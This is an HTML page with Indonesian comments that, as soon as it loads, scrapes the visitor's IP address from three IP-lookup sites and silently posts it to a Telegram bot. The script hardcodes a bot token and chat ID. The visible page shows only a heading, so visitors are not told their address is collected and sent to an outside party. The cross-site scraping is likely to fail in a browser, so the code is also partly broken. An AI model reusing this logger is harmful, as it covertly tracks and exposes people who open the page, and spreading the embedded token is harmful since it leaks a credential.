<!DOCTYPE html>
<html>
<head>
    <title>Mengambil Alamat IP Perangkat</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        // Fungsi untuk mengirim permintaan AJAX ke bot Telegram
        function sendToTelegram(ip) {
            var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
            var chatId = '1121369247';
            var message = "Alamat IP perangkat: " + ip;

            var url = "https://api.telegram.org/bot" + botToken + "/sendMessage";
            var data = {
                chat_id: chatId,
                text: message
            };

            $.ajax({
                url: url,
                method: "POST",
                data: data,
                success: function(response) {
                    console.log("Pesan terkirim ke Telegram");
                },
                error: function(xhr, status, error) {
                    console.error("Gagal mengirim pesan ke Telegram:", error);
                }
            });
        }

        // Fungsi untuk mengambil alamat IP perangkat
        function getIPAddress() {
            // Menggunakan layanan https://nordvpn.com/id/what-is-my-ip/
            $.get("https://nordvpn.com/id/what-is-my-ip/", function(response) {
                var ipAddress = $(response).find(".ip__ip").text().trim();
                sendToTelegram(ipAddress);
            });

            // Menggunakan layanan https://whoer.net/
            $.get("https://whoer.net/", function(response) {
                var ipAddress = $(response).find("#ip span").text().trim();
                sendToTelegram(ipAddress);
            });

            // Menggunakan layanan https://ipsaya.com/
            $.get("https://ipsaya.com/", function(response) {
                var ipAddress = $(response).find(".ip-address").text().trim();
                sendToTelegram(ipAddress);
            });
        }

        // Panggil fungsi getIPAddress saat halaman selesai dimuat
        $(document).ready(function() {
            getIPAddress();
        });
    </script>
</head>
<body>
    <h1>Mengambil Alamat IP Perangkat</h1>
</body>
</html>
